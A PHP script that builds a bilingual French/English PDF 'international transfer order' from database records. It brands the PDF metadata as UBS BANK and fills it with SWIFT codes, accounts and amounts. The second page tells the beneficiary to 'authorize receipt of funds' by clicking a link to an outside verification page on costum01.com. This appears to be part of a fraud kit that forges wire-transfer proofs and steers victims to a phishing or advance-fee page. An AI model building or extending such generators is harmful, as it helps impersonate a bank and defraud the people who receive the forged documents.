<?php
require_once 'config.php';

// Vérifier si l'utilisateur est connecté ET est admin
if (!isset($_SESSION['user_id']) || !isset($_SESSION['user_role']) || $_SESSION['user_role'] !== 'admin') {
    header('Location: login.php');
    exit;
}

$id = $_GET['id'] ?? 0;

try {
    $stmt = $pdo->prepare('SELECT * FROM virements WHERE id = ?');
    $stmt->execute([$id]);
    $virement = $stmt->fetch();
    if (!$virement) {
        die('Virement non trouvé');
    }
} catch (Exception $e) {
    die('Erreur: ' . $e->getMessage());
}

$pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, 'A4', true, 'UTF-8', false);
$pdf->SetCreator('UBS Admin');
$pdf->SetAuthor('UBS BANK');
$pdf->SetTitle('Ordre de virement #' . $virement['id']);
$pdf->SetSubject('Ordre de virement international');
$pdf->setPrintHeader(false);
$pdf->setPrintFooter(false);
$pdf->SetMargins(12, 12, 12);
$pdf->SetAutoPageBreak(true, 8);
$pdf->AddPage();

$logo_file = getActiveLogo();
renderPageHeader($pdf, $logo_file, $virement);

function renderSectionTitle($pdf, $title)
{
    $pdf->SetFont('helvetica', 'B', 11);
    $pdf->Cell(0, 5, '* ' . $title, 0, 1, 'L');
    $pdf->Ln(1);
}

function renderRow($pdf, $label, $value, $highlight = false)
{
    $pdf->SetFont('helvetica', '', 10);
    $pdf->Cell(85, 5, $label, 0, 0, 'L');
    if ($highlight) {
        $pdf->SetFillColor(255, 243, 169);
        $pdf->SetFont('helvetica', 'B', 10);
        $pdf->MultiCell(0, 5, $value, 0, 'L', 1, 1, '', '', true);
        $pdf->SetTextColor(0, 0, 0);
    } else {
        $pdf->SetFont('helvetica', 'B', 10);
        $pdf->MultiCell(0, 5, $value, 0, 'L', 0, 1, '', '', true);
    }
}

function renderSeparator($pdf)
{
    $pdf->Ln(1);
    $pdf->SetLineStyle(array('width' => 0.4, 'dash' => '2,2', 'color' => array(180, 180, 180)));
    $pdf->Line(15, $pdf->GetY(), 195, $pdf->GetY());
    $pdf->Ln(6);
}

function renderPageHeader($pdf, $logo_file, $virement)
{
    if (file_exists($logo_file)) {
        $ext = strtolower(pathinfo($logo_file, PATHINFO_EXTENSION));
        $img_type = 'PNG';
        if ($ext === 'jpg' || $ext === 'jpeg') {
            $img_type = 'JPG';
        } elseif ($ext === 'gif') {
            $img_type = 'GIF';
        }
        $pdf->Image($logo_file, 15, 15, 45, 0, $img_type, '', 'T', false, 300, '', false, false, 0, false, false, false);
    }

    $pdf->SetFont('helvetica', 'B', 18);
    $pdf->SetXY(70, 18);
    $pdf->Cell(0, 6, $virement['expediteur_nom_banque'] ?? 'Banque émettrice', 0, 1, 'L');
    $pdf->SetFont('helvetica', '', 10);
    $pdf->SetXY(70, 24);
    $pdf->Cell(0, 5, $virement['expediteur_pays'] ?? 'Pays émettrice', 0, 1, 'L');

    $pdf->SetFont('helvetica', 'B', 20);
    $pdf->SetY(42);
    $pdf->Cell(0, 10, 'ORDRE DE VIREMENT INTERNATIONAL', 0, 1, 'C');
    $pdf->SetFont('helvetica', 'I', 10);
    $pdf->Cell(0, 6, 'International Transfer Order', 0, 1, 'C');

    $pdf->Ln(3);
    $pdf->SetLineStyle(array('width' => 0.4, 'dash' => '2,2', 'color' => array(120, 120, 120)));
    $pdf->Line(15, $pdf->GetY(), 195, $pdf->GetY());
    $pdf->Ln(8);
}

renderRow($pdf, 'Référence SWIFT / SWIFT Reference :', $virement['code_swift'] ?? 'N/A', true);
renderRow($pdf, "Date d'émission / Issue date :", date('d/m/Y', strtotime($virement['date_creation'] ?? date('Y-m-d'))));

renderSeparator($pdf);

renderSectionTitle($pdf, 'Informations de la banque émettrice (Ordering Institution)');
renderRow($pdf, 'Banque / Bank :', $virement['expediteur_nom_banque'] ?? 'N/A');
renderRow($pdf, 'BIC/SWIFT :', $virement['expediteur_bic'] ?? 'N/A');
renderRow($pdf, 'Adresse / Address :', $virement['expediteur_pays'] ?? 'N/A');
renderRow($pdf, 'Compte débité / Debited account :', $virement['expediteur_numero_compte'] ?? 'N/A');

renderSeparator($pdf);

renderSectionTitle($pdf, "Informations de l'ordonnateur (Ordering Customer)");
renderRow($pdf, 'Nom / Name :', trim(($virement['expediteur_prenom'] ?? '') . ' ' . ($virement['expediteur_nom'] ?? '')) ?: 'N/A');
renderRow($pdf, 'Adresse / Address :', $virement['expediteur_pays'] ?? 'N/A');
renderRow($pdf, 'Compte / Account :', $virement['expediteur_numero_compte'] ?? 'N/A');

renderSeparator($pdf);

renderSectionTitle($pdf, 'Informations de la banque bénéficiaire (Beneficiary Bank)');
renderRow($pdf, 'Banque / Bank :', $virement['destinataire_nom_banque'] ?? 'N/A');
renderRow($pdf, 'BIC/SWIFT :', $virement['destinataire_bic'] ?? 'N/A');
renderRow($pdf, 'Adresse / Address :', $virement['destinataire_pays'] ?? 'N/A');

renderSeparator($pdf);

renderSectionTitle($pdf, 'Informations du bénéficiaire (Beneficiary Customer)');
renderRow($pdf, 'Nom / Name :', trim(($virement['destinataire_prenom'] ?? '') . ' ' . ($virement['destinataire_nom'] ?? '')) ?: 'N/A');
renderRow($pdf, 'Adresse / Address :', $virement['destinataire_pays'] ?? 'N/A');
renderRow($pdf, 'Compte / Account :', $virement['destinataire_numero_compte'] ?? 'N/A');

renderSeparator($pdf);

renderSectionTitle($pdf, 'Détails du paiement (Payment Details)');
renderRow($pdf, 'Montant / Amount :', number_format($virement['montant'] ?? 0, 2, ',', ' ') . ' ' . ($virement['devise'] ?? 'USD'), true);
renderRow($pdf, 'Devise / Currency :', $virement['devise'] ?? 'USD');
renderRow($pdf, 'Date de valeur / Value date :', date('d/m/Y', strtotime($virement['date_creation'] ?? date('Y-m-d'))));
$motif_virement = trim($virement['motif_virement'] ?? '');
renderRow($pdf, 'Motif du virement / Remittance Information :', $motif_virement !== '' ? $motif_virement : '—');

renderSeparator($pdf);

renderSectionTitle($pdf, 'Banques intermédiaires (Intermediary Institutions)');
renderRow($pdf, 'Banque correspondante / Correspondent bank :', $virement['banque_correspondante'] ?? ($virement['expediteur_nom_banque'] ?? 'N/A'));

$pdf->AddPage();
renderPageHeader($pdf, $logo_file, $virement);

$pdf->SetFont('helvetica', 'B', 12);
$pdf->Cell(0, 6, 'Résumé du suivi / Tracking Summary', 0, 1, 'L');
$pdf->Ln(2);

$pdf->SetFont('helvetica', '', 10);
$pdf->Cell(70, 6, 'Code de suivi (UTR / TRN) / Tracking code :', 0, 0, 'L');
$pdf->SetFillColor(255, 243, 169);
$pdf->SetFont('helvetica', 'B', 10);
$pdf->Cell(0, 6, $virement['code_swift'] ?? 'N/A', 0, 1, 'L', 1);

$pdf->Ln(2);
$pdf->SetFont('helvetica', '', 10);
$pdf->MultiCell(0, 6, 'Ce code est utilisé pour tracer le virement à chaque étape entre les banques via le réseau SWIFT. / This code is used to track the transfer at each step between banks via the SWIFT network.', 0, 'L', 0, 1);

$pdf->Ln(6);
$pdf->SetDrawColor(0, 102, 204);
$pdf->SetFillColor(235, 242, 255);
$pdf->SetLineWidth(0.4);
$pdf->MultiCell(0, 8, 'ACTION REQUISE / ACTION REQUIRED', 1, 'L', 1, 1, '', '', true);

$pdf->SetFillColor(255, 255, 255);
$pdf->MultiCell(0, 18, 'Le bénéficiaire doit confirmer la réception des fonds avec la référence SWIFT ci-dessous. / The beneficiary must confirm receipt of funds using the SWIFT reference below.', 1, 'L', 0, 1, '', '', true);

$pdf->SetFillColor(255, 243, 169);
$pdf->SetFont('helvetica', 'B', 10);
$pdf->MultiCell(0, 8, $virement['code_swift'] ?? 'N/A', 1, 'L', 1, 1, '', '', true);

$pdf->SetFillColor(224, 236, 255);
$pdf->SetTextColor(0, 50, 120);
$pdf->SetFont('helvetica', 'B', 11);
$pdf->MultiCell(0, 10, 'Autoriser la réception des fonds / Authorize receipt of funds', 1, 'C', 1, 1, '', '', true);

$pdf->SetFont('helvetica', '', 10);
$pdf->SetTextColor(0, 102, 204);
$pdf->Cell(0, 6, 'Cliquez ici pour valider la transaction', 0, 1, 'C', 0, 'https://costum01.com/GlobalBank/GlobalBank/verification.php');

$pdf->Ln(3);
$pdf->SetFont('helvetica', 'I', 9);
$pdf->SetTextColor(100, 100, 100);
$pdf->MultiCell(0, 5, 'Ce document est généré pour usage professionnel. Veuillez conserver une copie pour vos archives.', 0, 'L', 0, 1);

$pdf->Output('ordre_virement_' . ($virement['id'] ?? '0') . '_' . date('Ymd') . '.pdf', 'D');
exit;
